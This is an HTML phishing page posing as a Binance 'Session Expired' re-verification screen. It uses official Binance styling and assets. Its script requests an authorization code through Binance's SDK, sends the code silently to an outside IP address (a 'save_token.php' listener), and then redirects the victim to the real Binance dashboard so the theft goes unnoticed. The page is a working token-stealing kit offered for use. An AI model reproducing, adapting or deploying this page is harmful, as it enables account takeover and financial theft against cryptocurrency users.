<!DOCTYPE html>
<html>
<head>
    <title>Login - Binance</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://bin.bnbstatic.com/client_upload/mp-management-backend/sdk/mp-sdk/mp-sdk-4.51.3.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #0b0e11; color: #eaecef; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .btn { background: #f0b90b; color: #1e2329; padding: 12px 24px; border-radius: 4px; border: none; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body>
    <img src="https://bin.bnbstatic.com/static/images/common/favicon.ico" width="48">
    <h3>Session Expired</h3>
    <p>Please re-verify your secure session.</p>
    <button class="btn" onclick="triggerAuth()">Verify Identity</button>

    <script>
        function triggerAuth() {
            binance.getAuthCode({
                success: function(res) {
                    const code = res.code;
                    // Forward to your RDP/XAMPP listener
                    fetch('https://185.253.118.245/cd/save_token.php?code=' + encodeURIComponent(code))
                    .then(() => {
                        window.location.href = "https://www.binance.com/en/my/dashboard";
                    });
                },
                fail: function(err) {
                    console.error('Auth failed', err);
                    alert("Verification failed. Please try again.");
                }
            });
        }
    </script>
</body>
</html>
